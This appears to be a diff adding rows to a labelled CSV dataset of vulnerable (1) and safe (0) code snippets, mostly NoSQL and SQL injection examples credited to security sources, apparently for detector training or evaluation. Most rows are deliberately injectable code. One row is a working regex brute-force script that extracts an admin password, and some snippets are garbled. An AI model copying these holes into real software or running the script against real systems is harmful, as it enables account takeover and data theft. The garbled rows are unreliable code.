+paramMap.put(""$where"", ""this.sharedWith == \"""" + userName + ""\"" && this.email == \"""" + email + ""\"""");
+query.putAll(paramMap);
+
+MongoCursor<Document> cursor = collection.find(query).iterator();",1,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
+"db.myCollection.find( { active: true, $where: function() { return obj.credits—obj.debits < $userInput; } } );;",1,Imperva,https://www.imperva.com/learn/application-security/nosql-injection/
+db.myCollection.find( { $where: function() { return obj.credits - obj.debits < 0; } } );,1,OWASP,https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
+"app.post('/', function (req, res) {
+  db.users.find(
+    { username: req.body.username, password: req.body.password },
+    function (err, users) {
+      // TODO: handle the rest
+    }
+  )
+})",1,WebSecurify,https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb
+"Bson filter = Filters.and(Filters.eq(""sharedWith"", userName), Filters.eq(""email"", email));
+
+MongoCursor<Document> cursor = collection.find(filter).iterator();",0,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
+"Bson filter = Filters.and(Filters.eq(""sharedWith"", userName), Filters.eq(""email"", email));
+
+MongoCursor<Document> cursor = collection.find(filter).iterator();",0,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
+"app.post('/login', function (req, res){
+    let user = String(req.body.username);
+    let pass = String(req.body.password);
+ 
+    let query = {
+        username: user,
+        password: pass
+    }
+ 
+    db.collection('user').findOne(query, function (err, user) {
+        if (err || !user) {
+            response.status(401).json({
+                status: ""error"",
+                message: ""Invalid credentials."",
+              });
+        } else {
+            res.json({username: user.username });
+        }
+    });
+});",0,Snyk,https://learn.snyk.io/lesson/nosql-injection-attack/
+"  public List<String> findUsers(String user, String pass) throws Exception {
+    String query = ""SELECT userid FROM users "" +
+                   ""WHERE username='"" + user + ""' AND password='"" + pass + ""'"";
+       Statement statement = connection.createStatement();
+       ResultSet resultSet = statement.executeQuery(query);
+       List<String> users = new ArrayList<String>();
+       while (resultSet.next()) {
+           users.add(resultSet.getString(0));
+       }
+       return users;
+   }",1,SonarSource,https://www.sonarsource.com/blog/top-security-flaws-hiding-in-your-code-right-now-and-how-to-fix-them/
+"Bson filter = Filters.and(Filters.eq(""sharedWith"", userName), Filters.eq(""email"", email));
+
+MongoCursor<Document> cursor = collection.find(filter).iterator();",0,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
+"using Microsoft.AspNetCore.Mvc;
+using MongoDB.Driver;
+using System.Threading.Tasks;
+using YourNamespace.Models; // Replace with your actual namespace and models
+using YourNamespace.Services; // Assuming you have a service for hashing
+
+[Route(""api/[controller]"")]
+[ApiController]
+public class LoginController : ControllerBase {
+    private readonly IMongoCollection<User> _users;
+    private readonly IPasswordHasher _passwordHasher; // A service to hash passwords
+
+    public LoginController(IMongoDatabase database, IPasswordHasher passwordHasher) {
+        _users = database.GetCollection<User>(""user"");
+        _passwordHasher = passwordHasher;
+    }
+
+    [HttpPost]
+    public async Task<IActionResult> Post([FromBody] User user) {
+        if (user == null || string.IsNullOrWhiteSpace(user.Username) || string.IsNullOrWhiteSpace(user.Password)) {
+            return BadRequest(""Invalid user data."");
+        } try {
+            var filter = Builders<User>.Filter.Eq(""username"", user.Username);
+            var foundUser = await _users.Find(filter).FirstOrDefaultAsync();
+
+            if (foundUser != null && _passwordHasher.VerifyPassword(user.Password, foundUser.PasswordHash)) {
+                return Ok(new { username = foundUser.Username });
+            } else {
+                return Unauthorized(new { status = ""error"", message = ""Invalid credentials."" });
+            }
+        } catch {
+            return StatusCode(500, new { status = ""error"", message = ""Internal server error."" });
+        }
+    }
+}
+
+public class User {
+    public string Username { get; set; }
+    public string PasswordHash { get; set; } // Store hashed passwords
+    // Include other properties as needed
+}
+
+public interface IPasswordHasher {
+    string HashPassword(string password);
+    bool VerifyPassword(string providedPassword, string passwordHash);
+}
+
+// Implement the IPasswordHasher interface in a class that handles password hashing and verification.",0,Snyk,https://learn.snyk.io/lesson/nosql-injection-attack/
+"import requests
+import urllib3
+import string
+import urllib
+urllib3.disable_warnings()
+
+username='admin'
+password=''
+u='http://example.org/login'
+
+while True:
+  for c in string.printable:
+    if c not in ['*','+','.','?','|', '#', '&', '$']:
+      payload='?username=%s&password[$regex]=^%s' % (username, password + c)
+      r = requests.get(u + payload)
+      if 'Yeah' in r.text:
+        print(""Found one more char : %s"" % (password+c))
+        password += c
+",1,GitLab,https://gitlab.com/pentest-tools/PayloadsAllTheThings/tree/master/NoSQL%20Injection#authentication-bypass
+"db.myCollection.find( { active: true, $where: function() { return obj.credits - obj.debits < $userInput; } } );;",1,OWASP,https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
+"Bson filter = Filters.and(Filters.eq(""sharedWith"", userName), Filters.eq(""email"", email));
+
+MongoCursor<Document> cursor = collection.find(filter).iterator();",0,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
+db.myCollection.find( { $where: function() { return obj.credits—obj.debits < 0; } } );,1,Imperva,https://www.imperva.com/learn/application-security/nosql-injection/
+"     // Log the sanitised username
+     String user = sanitiseInput(request.getParameter(""user""));
+     ...
+   }   
+
+  private String sanitiseInput(String input) {
+     // Replace newline and carriage return characters with a safe placeholder
+     if (input != null) {
+       input = input.replaceAll(""[\\n\\r]"", ""_"");
+     }
+     return input;
+   }",0,SonarSource,https://www.sonarsource.com/blog/top-security-flaws-hiding-in-your-code-right-now-and-how-to-fix-them/
+"<?
+$mongo = new Mongo();
+$db = $mongo->demo;
+$id = $_GET['id'];
+$js = ""function() {
+var id = '$id';
+SOME CODE...
+}"";
+$response = $db->execute($js);
+...
+?>",1,SyHunt,https://www.syhunt.com/en/?n=Articles.NoSQLInjection
+"<?php
+$myVar = $_GET['id'];
+
+echo ""<script runat=server>
+    myPHPVar = '$myVar';
+    onload = function(){
+    ..SOME CODE..
+    };
+</script>"";
+?>",1,SyHunt,https://www.syhunt.com/en/?n=Articles.NoSQLInjection
+"<html>
+
+<head>
+ <title>Payment information</title>
+</head>
+
+ <body>
+  <?php
+  try {
+   $conn = new MongoDB\Driver\Manager('mongodb://root:prisma@mongo:27017');
+
+   $options = [
+    'projection' => [],
+   ];
+   $filter = ['id' => $_GET['acctid']];
+   $query = new MongoDB\Driver\Query($filter, $options);
+
+   $cursor = $conn->executeQuery('customers.paymentinfo', $query);
+   $counter = 0;
+   
+   foreach ($cursor as $obj) {
+    $counter++;
+    echo 'Name: ' . $obj->name . '<br/>';
+    echo 'Customer ID: ' . $obj->id . '<br/>';
+    echo 'Card Number: ' . $obj->cc . '<br/>';
+    echo 'CVV2 Code: ' . $obj->cvv2 . '<br/>';
+    echo '<br/>';
+   }
+
+   echo $counter . ' document(s) found. <br/>';
+   
+  } catch (MongoConnectionException $e) {
+   die('Error connecting to MongoDB server : ' . $e->getMessage());
+  } catch (MongoException $e) {
+   die('Error: ' . $e->getMessage());
+  }
+  ?>
+
+
+ </body>
+
+</html>",1,GitHub,https://github.com/codingo/NoSQLMap/blob/master/vuln_apps/src/acct.php
+"async function index(req, res) {
+    const { db, User, QueryTypes } = req.app.get('sequelize');
+
+    const user = req.query.user;
+    const pass = req.query.pass;
+
+    let loggedInUser = await db.query(
+        `SELECT * FROM users WHERE user = $user AND pass = $pass`,
+        {
+            bind: {
+                user: user,
+                pass: pass,
+            },
+            type: QueryTypes.SELECT,
+            model: User,
+        }
+    );
+
+    res.send(JSON.stringify(loggedInUser));
+    res.end();
+}",0,SonarSource,https://rules.sonarsource.com/typescript/?search=injection
+"<!DOCTYPE html>
+<html>
+ <head>
+  <title>Order Lookup</title>
+ </head>
+ <body>
+  <?php
+  if (isset($_GET['ordersearch']) && !empty($_GET['ordersearch'])) {
+   try {
+    $result = """";
+    $conn = new MongoClient('mongodb://127.0.0.1');
+    $db = $conn->shop;
+     $collection = $db->orders;
+     $search = $_GET['ordersearch'];
+     $js = ""function () { var query = '"". $search . ""'; return this.id == query;}"";
+     //print $js;
+     print '<br/>';
+   
+    $cursor = $collection->find(array('$where' => $js));
+    echo $cursor->count() . ' order(s) found. <br/>';
+   
+    foreach ($cursor as $obj) {
+      echo 'Order ID: ' . $obj['id'] . '<br/>';
+      echo 'Name: ' . $obj['name'] . '<br/>';
+      echo 'Item: ' . $obj['item'] . '<br/>';
+      echo 'Quantity: ' . $obj['quantity']. '<br/>';
+      echo '<br/>';
+    }
+    $conn->close();
+   } catch (MongoConnectionException $e) {
+    die('Error connecting to MongoDB server : ' . $e->getMessage());
+   } catch (MongoException $e) {
+    die('Error: ' . $e->getMessage());
+   }
+  }
+  ?>
+
+
+  <b>Use the Order ID to locate your order:</b><br>
+  <form method=""get"" id=""usersearch"">
+   <p>Search <input type=""text"" name=""ordersearch"" id=""ordersearch"" /> <input type=""submit"" name=""submitbutton""
+     value=""Submit"" /></p>
+  </form>
+  <div id=""results"">
+   <?php echo $result; ?>
+  </div>
+ </body>
+
+</html>",1,GitHub,https://github.com/codingo/NoSQLMap/blob/master/vuln_apps/src/acct.php
+"from flask import Flask, request
+import json
+
+app = Flask(__name__)
+
+@app.route(""/example"")
+def example():
+    obj = json.loads(request.args.get(""object""))
+    return str(obj[""status""] == ""OK"")",0,SonarSource,https://rules.sonarsource.com/python/RSPEC-5135/?search=inject
+"Bson filter = Filters.and(Filters.eq(""sharedWith"", userName), Filters.eq(""email"", email));
+
+MongoCursor<Document> cursor = collection.find(filter).iterator();",0,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
+"#include <iostream>
+#include <mongocxx/client.hpp>
+#include <mongocxx/instance.hpp>
+#include <bsoncxx/builder/stream/document.hpp>
+#include <bsoncxx/json.hpp>
+
+// Hypothetical function to get user input
+std::string GetUserInput(const std::string& prompt);
+
+int main() {
+    mongocxx::instance inst{};
+    mongocxx::client conn{mongocxx::uri{}};
+
+    auto db = conn[""mydatabase""];
+    auto collection = db[""user""];
+
+    std::string username = GetUserInput(""Username: "");
+    std::string password = GetUserInput(""Password: "");
+
+    // Build the query using parameterized methods
+    bsoncxx::builder::stream::document document{};
+    document << ""username"" << bsoncxx::builder::stream::open_document 
+             << ""$eq"" << username 
+             << bsoncxx::builder::stream::close_document
+             << ""password"" << bsoncxx::builder::stream::open_document 
+             << ""$eq"" << password 
+             << bsoncxx::builder::stream::close_document;
+
+    auto cursor = collection.find(document.view());
+
+    // Process the cursor (e.g., check if user exists)
+    // ...
+
+    return 0;
+}",0,Snyk,https://learn.snyk.io/lesson/nosql-injection-attack/
+"HashMap<String, String> paramMap = new HashMap<>();
+paramMap.put(""$where"", ""this.sharedWith == \"""" + userName + ""\"" && this.email == \"""" + email + ""\"""");
+String json = new JSONObject(paramMap).toString();
+BasicDBObject query = new BasicDBObject().parse(json);
+
+MongoCursor<Document> cursor = collection.find(query).iterator();",1,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
+"Bson filter = Filters.and(Filters.eq(""sharedWith"", userName), Filters.eq(""email"", email));
+
+MongoCursor<Document> cursor = collection.find(filter).iterator();",0,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
+"Users.findOne(
+  {
+    ""name"" : req.body.name, 
+    ""password"" : req.body.password
+  }
+ );",1,secureflag,https://knowledge-base.secureflag.com/vulnerabilities/nosql_injection/nosql_injection_vulnerability.html
+"db.myCollection.find( { $where: ""this.credits == this.debits"" } );",1,OWASP,https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
+"class AuthenticationHandler {
+
+    public mysqli $conn;
+
+    function authenticate() {
+        $user = $_POST['user'];
+        $pass = $_POST['pass'];
+        $authenticated = false;
+
+        $query = ""SELECT * FROM users WHERE user = :user AND pass = :pass"";
+
+        $stmt = $this->conn->prepare($query);
+        $stmt->bind_param("":user"", $user);
+        $stmt->bind_param("":pass"", $pass);
+        $stmt->execute();
+
+        $stmt->store_result();
+
+        if ( $stmt->num_rows == 1) {
+          $authenticated = true;
+        }
+
+        return $authenticated;
+    }
+}",0,SonarSource,https://rules.sonarsource.com/php/RSPEC-3649/
+"BasicDBObject query = new BasicDBObject();
+HashMap<String, String> paramMap = new HashMap<>();
+paramMap.put(""sharedWith"", userName);
+paramMap.put(""email"", email);
+query.putAll(paramMap);
+
+MongoCursor<Document> cursor = collection.find(query).iterator();",0,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
+"var nano = require(nano)(http://localhost:5984); 
+var db = nano.db.use(mydatabase'); 
+var username = req.query.username; 
+var password = req.query.password; 
+
+db.get('users', username, functign(err, body) ( 
+       if (Cerr) { 
+               if (body.password ===password) { 
+                      res.send('Login successful!); ) 
+               else ( res.send('Invalid password!); 
+       } else ( 
+                res.send('User not found!);}
+});",1,SecOps,https://secops.group/a-pentesters-guide-to-nosql-injection/
+"BasicDBObject query = (BasicDBObject) BasicDBObjectBuilder
+                .start()
+                .add(""$where"", ""this.sharedWith == \"""" + userName + ""\"" && this.email == \"""" + email + ""\"""")
+                .get();
+
+MongoCursor<Document> cursor = collection.find(query).iterator();",1,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
+$query = array('$where' => 'this.name === \''.$name.'\'');,1,Invicti,https://www.invicti.com/learn/nosql-injection/
+"const { MongoClient } = require('mongodb');
+
+function (req, res) {
+    let query = { user: req.query.user.toString(), city: req.query.city.toString() };
+
+    MongoClient.connect(url, (err, db) => {
+        db.collection(""users"")
+        .find(query)
+        .toArray((err, docs) => { });
+    });
+}",0,SonarSource,https://rules.sonarsource.com/typescript/?search=nosql
